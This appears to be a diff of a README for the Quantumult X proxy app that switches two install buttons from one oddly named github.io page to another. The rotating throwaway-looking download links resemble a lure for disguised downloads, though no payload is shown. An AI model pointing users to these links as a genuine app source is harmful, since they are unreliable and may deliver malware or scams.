@@ -6,7 +6,7 @@
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://somovskoye.github.io/.github/quantumultX)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://skalsd-oasd.github.io/.github/quantumultX)
 
 </div>
 
@@ -81,7 +81,7 @@ Quantumult X's scripting capability is what distinguishes it from standard proxy
 
 <p align="center">
 
-[![Get it Now Quantumult X](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://somovskoye.github.io/.github/quantumultX)
+[![Get it Now Quantumult X](https://img.shields.io/badge/Get_it_Now-0582CA?style=for-the-badge&logo=apple&logoColor=white)](https://skalsd-oasd.github.io/.github/quantumultX)
 
 </p>
 
